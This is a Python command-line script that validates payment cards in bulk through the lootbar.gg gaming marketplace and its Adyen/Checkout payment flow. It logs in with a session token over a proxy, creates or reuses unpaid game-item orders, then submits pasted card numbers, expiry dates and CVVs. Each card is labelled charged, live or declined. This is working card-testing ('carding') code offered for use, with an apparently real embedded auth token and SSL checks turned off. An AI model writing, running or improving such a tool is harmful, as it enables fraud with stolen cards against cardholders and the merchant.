import asyncio
import sys
import os
import aiohttp
import json
import uuid
from lootbar_checker import LootbarAdyenChecker, LootbarAccount, _base_headers, _generate_device_fingerprint, API_BASE

AUTH_TOKEN = os.environ.get("LB_TOKEN", "f9ff045d-8b0d-4801-9a9c-6d7674b304cb")
PROXY = os.environ.get("LB_PROXY", "")


async def fetch_fresh_bill(auth_token: str, proxy_url: str = None) -> str:
    fp = _generate_device_fingerprint(auth_token)
    headers = _base_headers(auth_token, fp)
    headers["Content-Type"] = "application/json"

    connector = aiohttp.TCPConnector(ssl=False, limit=5)
    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        print("[*] Checking account validity...")
        try:
            for user_endpoint in [
                f"{API_BASE}/api/user/info",
                f"{API_BASE}/api/v2/user/info",
                f"{API_BASE}/api/user/account",
            ]:
                try:
                    async with session.get(
                        user_endpoint,
                        headers=headers,
                        proxy=proxy_url
                    ) as resp:
                        if resp.status == 404:
                            continue
                        text = await resp.text()
                        if not text.strip().startswith('{'):
                            continue
                        r = json.loads(text)
                        if r.get('status') == 'ok':
                            user_data = r.get('data', {})
                            nickname = user_data.get('nickname', user_data.get('name', user_data.get('email', 'User')))
                            print(f"[+] Logged in as: {nickname}")
                            break
                        elif r.get('status') in ('Unauthorized', 'Invalid Token', 'UNAUTHORIZED'):
                            print(f"[!] Auth token invalid or expired: {r.get('msg', r.get('status', ''))}")
                            print("[!] Get a fresh token from lootbar.gg (copy your PS cookie)")
                            return ""
                except Exception:
                    continue
            else:
                print("[*] Could not verify account, but will try to proceed anyway...")
        except Exception as e:
            print(f"[!] Could not reach Lootbar API: {e}")
            return ""

        print("[*] Scanning for existing unpaid bills...")
        for status_code in [1, 2]:
            try:
                async with session.get(
                    f"{API_BASE}/api/v2/market/bill_order?status={status_code}&page_num=1&page_size=20",
                    headers=headers,
                    proxy=proxy_url
                ) as resp:
                    text = await resp.text()
                    r = json.loads(text) if text.strip().startswith('{') else {}
                    items = r.get('data', {}).get('items', []) if isinstance(r.get('data'), dict) else []
                    for item in items:
                        bid = item.get('bill_order_id', item.get('id', ''))
                        if bid:
                            try:
                                async with session.post(
                                    f"{API_BASE}/api/market/goods/cashier/repay_preview",
                                    headers=headers,
                                    json={"game": "main", "bill_order_id": bid},
                                    proxy=proxy_url
                                ) as prev_resp:
                                    pr = await prev_resp.json()
                                    if pr.get('status') == 'ok':
                                        bill = pr.get('data', {}).get('bill_order', {})
                                        mpid = bill.get('market_pay_id')
                                        if mpid:
                                            print(f"[+] Found existing bill: {bid}")
                                            return bid
                            except Exception:
                                pass
            except Exception:
                pass

        print("[*] No existing bills found, creating new order (PUBG 60UC)...")
        pubg_sell_order_id = "T1072890084"
        pubg_uid = "5" + ''.join([str(ord(c) % 10) for c in str(uuid.uuid4())[:9]])
        buy_payload = {
            "game": "pubg",
            "sell_order_id": pubg_sell_order_id,
            "pay_method": 7,
            "num": 1,
            "allow_repay": True,
            "extra": {"uid": pubg_uid},
        }
        try:
            async with session.post(
                f"{API_BASE}/api/market/goods/buy",
                headers=headers,
                json=buy_payload,
                proxy=proxy_url
            ) as resp:
                r = await resp.json()
                if r.get('status') == 'ok':
                    data = r.get('data', {})
                    item = data.get('item', {}) if isinstance(data.get('item'), dict) else {}
                    bill_id = (data.get('buy_order_id', '') or data.get('bill_order_id', '')
                               or item.get('bill_order_id', '') or item.get('buy_order_id', ''))
                    if bill_id:
                        print(f"[+] Created new bill: {bill_id}")
                        return bill_id
                    else:
                        print(f"[!] Buy succeeded but no bill_order_id in response")
                        print(f"    Response data keys: {list(data.keys())}")
                else:
                    msg = r.get('msg', '')
                    print(f"[!] PUBG buy failed: {msg}")
                    if 'balance' in msg.lower() or 'insufficient' in msg.lower():
                        print("[!] Account may have insufficient balance for the order")
        except Exception as e:
            print(f"[!] PUBG buy error: {e}")

        print("[*] Trying alternate items...")
        alt_games = [
            ("arc-raiders", "T1073270064"),
            ("dota-2", None),
            ("counter-strike-2", None),
        ]
        for game, sell_id in alt_games:
            if not sell_id:
                try:
                    async with session.get(
                        f"{API_BASE}/api/market/goods?game={game}&page_num=1&page_size=1&sort=1",
                        headers=headers,
                        proxy=proxy_url
                    ) as resp:
                        r = await resp.json()
                        items = r.get('data', {}).get('items', [])
                        if items:
                            sell_id = items[0].get('sell_order_id', '')
                except Exception:
                    continue
            if not sell_id:
                continue
            try:
                create_payload = {
                    "game": game,
                    "sell_order_id": sell_id,
                    "pay_method": 7,
                    "allow_repay": True,
                    "market_source": 1,
                    "currency": "USD"
                }
                async with session.post(
                    f"{API_BASE}/api/market/goods/buy",
                    headers=headers,
                    json=create_payload,
                    proxy=proxy_url
                ) as resp:
                    r = await resp.json()
                    if r.get('status') == 'ok':
                        item = r.get('data', {}).get('item', {})
                        bill_id = item.get('bill_order_id', '')
                        if bill_id:
                            print(f"[+] Created bill via {game}: {bill_id}")
                            return bill_id
                    else:
                        print(f"    {game}: {r.get('msg', '')[:50]}")
            except Exception:
                continue

        print("[!] Could not get a valid bill. Your account may need a manual order on lootbar.gg")
        return ""


async def main():
    global AUTH_TOKEN, PROXY

    args = sys.argv[1:]
    new_args = []
    manual_bill = ""
    for arg in args:
        if arg.startswith("--bill="):
            manual_bill = arg.split("=", 1)[1]
        elif arg.startswith("--token="):
            AUTH_TOKEN = arg.split("=", 1)[1]
        elif arg.startswith("--proxy="):
            PROXY = arg.split("=", 1)[1]
        else:
            new_args.append(arg)

    from lootbar_checker import _parse_proxy_url
    proxy_url = _parse_proxy_url(PROXY)

    print(f"Account: {AUTH_TOKEN[:12]}...")
    print(f"Proxy: {PROXY or 'direct'}")

    if manual_bill:
        bill_order_id = manual_bill
        print(f"Bill: {bill_order_id} (manual)")
    else:
        print(f"\n--- Auto-fetching bill ---")
        bill_order_id = await fetch_fresh_bill(AUTH_TOKEN, proxy_url)
        if not bill_order_id:
            print("\nFailed to get a bill. Provide one manually:")
            print(f"  python3 lb_shell.py --token={AUTH_TOKEN[:12]}... --bill=BILL_ID")
            return

    acc = LootbarAccount(
        auth_token=AUTH_TOKEN,
        bill_order_id=bill_order_id,
        proxy=PROXY,
        label="shell_acc"
    )
    checker = LootbarAdyenChecker(accounts=[acc])

    if new_args:
        cards_raw = " ".join(new_args)
    else:
        print("\nPaste cards (cc|mm|yy or cc|mm|yy|cvv), one per line.")
        print("Press Enter on empty line when done:\n")
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line.strip():
                break
            lines.append(line.strip())
        cards_raw = "\n".join(lines)

    cards = [l.strip() for l in cards_raw.replace(",", "\n").split("\n") if l.strip()]

    if not cards:
        print("No cards provided.")
        return

    print(f"\n{'='*55}")
    print(f" LOOTBAR CHECKER (CKO+Adyen) — {len(cards)} card(s)")
    print(f" Bill: {bill_order_id}")
    print(f"{'='*55}\n")

    live, dead, errs = 0, 0, 0
    for i, card_line in enumerate(cards, 1):
        parts = card_line.split("|")
        if len(parts) < 3:
            print(f"[{i}/{len(cards)}] SKIP | Bad format: {card_line}")
            errs += 1
            continue

        cc, mm, yy = parts[0].strip(), parts[1].strip(), parts[2].strip()
        cvv = parts[3].strip() if len(parts) >= 4 else ""
        masked = cc[:6] + "x" * (len(cc) - 10) + cc[-4:] if len(cc) >= 10 else cc

        result, details = await checker.check_card(cc, mm, yy, cvv)

        tag = result.upper()
        if result == "approved":
            tag = "CHARGED"
            live += 1
        elif result == "live":
            tag = "APPROVED"
            live += 1
        elif result == "ccn":
            tag = "CCN"
            live += 1
        elif result == "declined":
            tag = "DECLINED"
            dead += 1
        else:
            tag = "ERROR"
            errs += 1

        symbol = {"CHARGED": "\U0001f48e", "APPROVED": "\u2705", "CCN": "\U0001f522", "DECLINED": "\u274c", "ERROR": "\u26a0\ufe0f"}.get(tag, "?")
        print(f"[{i}/{len(cards)}] {symbol} {tag} | {masked}|{mm}|{yy} | {details}")

        if checker.get_alive_count() == 0:
            remaining = len(cards) - i
            if remaining > 0:
                print(f"\n\u26d4 ALL ACCOUNTS DEAD — skipping {remaining} remaining cards")
                print(f"\nTo fix: restart with a fresh token:")
                print(f"  python3 lb_shell.py --token=NEW_TOKEN")
                errs += remaining
            break

    print(f"\n{'='*55}")
    print(f" DONE — Live: {live} | Dead: {dead} | Errors: {errs}")
    print(f"{'='*55}")

asyncio.run(main())
